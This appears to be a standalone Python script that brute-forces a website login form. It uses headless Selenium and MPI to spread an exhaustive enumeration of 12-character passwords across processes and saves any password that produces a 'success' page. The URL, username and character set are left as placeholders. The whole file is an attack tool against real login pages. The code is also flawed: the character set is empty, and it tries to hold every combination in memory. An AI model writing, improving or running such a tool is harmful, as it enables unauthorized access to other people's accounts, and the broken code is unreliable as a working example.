import time
from itertools import product
from selenium import webdriver
from mpi4py import MPI

output_file = 'passwords.txt'
password_length = 12
character_set = ''

chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--disable-gpu')
chrome_options.add_argument('--no-sandbox')
driver = webdriver.Chrome(options=chrome_options)


def check_password(password):
    print('Checking password:', password)
    driver.get('Your Link Here')
    username_field = driver.find_element_by_name('User ID')
    username_field.send_keys('USERNAME HERE')
    password_field = driver.find_element_by_name('Password')
    password_field.send_keys(password)
    password_field.submit()
    time.sleep(2)  # Wait for page to load
    return 'success' in driver.page_source


comm = MPI.COMM_WORLD
rank = comm.Get_rank()
size = comm.Get_size()

possible_passwords = list(product(character_set, repeat=password_length))
chunk_size = len(possible_passwords) // size
start = rank * chunk_size
end = start + chunk_size if rank != size - 1 else len(possible_passwords)

print('Rank:', rank, 'Start:', start, 'End:', end)

successful_passwords = []
for password_tuple in possible_passwords[start:end]:
    password = ''.join(password_tuple)
    if check_password(password):
        successful_passwords.append(password)

all_successful_passwords = comm.gather(successful_passwords, root=0)

if rank == 0:
    with open(output_file, 'w') as file:
        for passwords in all_successful_passwords:
            file.writelines([password + '\n' for password in passwords])

    print('Passwords generated and saved to', output_file)

driver.quit()
